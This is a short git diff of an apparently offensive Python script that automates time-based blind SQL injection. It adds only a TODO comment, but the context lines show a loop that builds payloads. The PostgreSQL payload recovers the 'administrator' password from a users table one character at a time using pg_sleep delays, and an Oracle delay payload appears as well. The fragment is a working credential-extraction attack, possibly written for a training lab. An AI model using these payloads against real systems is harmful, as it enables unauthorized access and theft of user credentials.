@@ -36,7 +36,7 @@ for key in databaseFingerprintingDict:
 while restart:
     counter = counter +1
     for item in alphabetList:
-
+#Todo. Change oracle, microsoft and mysql to be correct injection etc.
         databaseFingerprintingDict =  {
         "postgresql":" SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = \'administrator\' AND SUBSTRING(password, {}, 1) = \'{}\') = 1 THEN pg_sleep(3) ELSE pg_sleep(0) END--".format(counter,item),
         "oracle":"SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),3) ELSE NULL END FROM dual--",
